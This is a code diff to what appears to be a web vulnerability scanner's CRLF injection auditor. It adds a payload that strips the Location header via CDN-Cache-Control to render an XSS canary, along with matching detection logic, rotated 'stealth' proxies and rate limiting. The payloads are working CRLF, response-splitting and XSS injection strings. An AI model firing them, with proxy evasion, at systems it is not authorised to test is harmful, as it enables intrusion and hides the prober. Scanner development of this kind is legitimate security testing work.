@@ -10,11 +10,13 @@ from typing import Any, Dict, Iterable, List, Optional
 import httpx
 from sqlalchemy.orm import Session
 
+from backend_api.config import settings
 from backend_api.models.endpoint import Endpoint
 from backend_api.models.param import Param
 from backend_api.models.finding import Finding, FindingStatus, Severity
 from backend_api.utils.logger import logger
 from backend_api.utils.request_builder import RequestBuilder
+from backend_api.utils.rate_limiter import rate_limited_call
 
 
 class CRLFInjectionAuditor:
@@ -33,6 +35,8 @@ class CRLFInjectionAuditor:
         ("%0d%0aSet-Cookie:%20xssboss_canary=1;%20Path=/;%20HttpOnly", "cookie_injection", Severity.MEDIUM),
         # Response splitting with double CRLF injecting HTML body
         ("%0d%0a%0d%0a<svg/onload=__XSS__('crlf_split')>", "response_splitting_xss", Severity.HIGH),
+        # CDN Location Strip via CDN-Cache-Control (stops 3xx redirect and forces body render, from CRLF Desync paper)
+        ("%0d%0aCDN-Cache-Control:%20private=%22Location%22%0d%0a%0d%0a<svg/onload=__XSS__('crlf_cdn_strip')>", "cdn_location_strip_xss", Severity.HIGH),
         # Unicode CRLF bypass (%E5%98%8D%E5%98%8A -> \r\n after normalization)
         ("%E5%98%8D%E5%98%8AX-Unicode-CRLF:%20canary_ok", "unicode_crlf_injection", Severity.MEDIUM),
         # Raw / tab space variant
@@ -94,9 +98,20 @@ class CRLFInjectionAuditor:
             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
         }
 
+        from backend_api.utils.stealth import get_http_proxy_kwargs
+        proxy_kwargs = get_http_proxy_kwargs(rotated=True)
+
         try:
-            with httpx.Client(timeout=4.0, follow_redirects=False, verify=False) as client:
-                resp = client.get(target_url, headers=headers)
+            with httpx.Client(
+                timeout=4.0,
+                follow_redirects=False,
+                verify=not settings.ALLOW_INSECURE_TLS,
+                **proxy_kwargs,
+            ) as client:
+                resp = rate_limited_call(
+                    target_url,
+                    lambda: client.get(target_url, headers=headers),
+                )
                 
                 # Check 1: Injected header present in response headers
                 for h_name, h_val in resp.headers.items():
@@ -121,6 +136,13 @@ class CRLFInjectionAuditor:
                         "severity": Severity.HIGH,
                         "status_code": resp.status_code,
                         "evidence": "Injected HTML body confirmed after response splitting headers."
+                    }
+                if any("cdn-cache-control" in h.lower() for h in resp.headers.keys()) and "<svg/onload=__XSS__('crlf_cdn_strip')>" in resp.text:
+                    return {
+                        "type": "cdn_location_strip_xss",
+                        "severity": Severity.HIGH,
+                        "status_code": resp.status_code,
+                        "evidence": "Location header stripped via CDN-Cache-Control enabling rendered HTML XSS body."
                     }
         except Exception:
             pass
